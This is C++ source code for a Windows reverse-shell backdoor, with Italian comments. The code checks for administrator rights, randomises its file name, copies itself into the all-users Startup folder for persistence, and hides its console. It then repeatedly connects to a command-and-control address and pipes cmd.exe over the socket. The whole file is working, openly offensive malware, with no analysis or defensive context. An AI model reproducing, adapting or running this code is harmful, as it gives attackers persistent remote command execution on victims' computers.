// dev by condor
#include <iostream>
#include <string>
#include <ctime>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
using namespace std;

//verifica sia eseguito come amministratore
BOOL IsElevated( ) {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if( OpenProcessToken( GetCurrentProcess( ),TOKEN_QUERY,&hToken ) ) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof( TOKEN_ELEVATION );
        if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if( hToken ) {
        CloseHandle( hToken );
    }
    return fRet;
}
//get the reverse shell
void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);//questo
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  
        addr.sin_port = htons(C2Port);    

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
//we randomize the name of the program and consequently that of the process ;)
string random(){
    string min_char[] = {"a","b","c","d","e","f","g","h","i","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"};
    int r;
	srand((unsigned)time(0)); 
	
    r = (rand()%22)+1;    
        
	while (r>23 || r<0){
    	r = (rand()%22)+1;    
    }
    string c = min_char[r];
    
    return c+".exe";
}

int main(int argc, char* argv[]){
	string percorso = argv[0], name ,new_name=random();
	const size_t last_slash_idx = percorso.find_last_of("\\/");
	const string hard_percorso = percorso;
	//trovo il nome del file
    if (std::string::npos != last_slash_idx){
		name = percorso.erase(0, last_slash_idx + 1);
    }
	string percorso_nome = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + name;
	
	if (hard_percorso == percorso_nome or IsElevated()){
	    
	    //take persistence
	    if (hard_percorso != percorso_nome){
	    	//rinomino il file
	    	system(("rename " + name + " " + new_name).c_str());
			system(("move \"" + new_name + "\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"").c_str());
	    }
	    FreeConsole();
	    if (argc == 3) {
			int port  = atoi(argv[2]); 
			RunShell(argv[1], port);
	    }else {
			char host[] = "172.16.32.120";  // change this to your ip address
			int port = 4444;                //change this to your open port
			RunShell(host, port);
	    }
	} else {
		string type_error = "Permission Error";
		string error = "You Must use Administrative permisions to execute me!";
		MessageBoxA(NULL, error.c_str(), type_error.c_str(), MB_ICONERROR);
	}
	return 0;
}
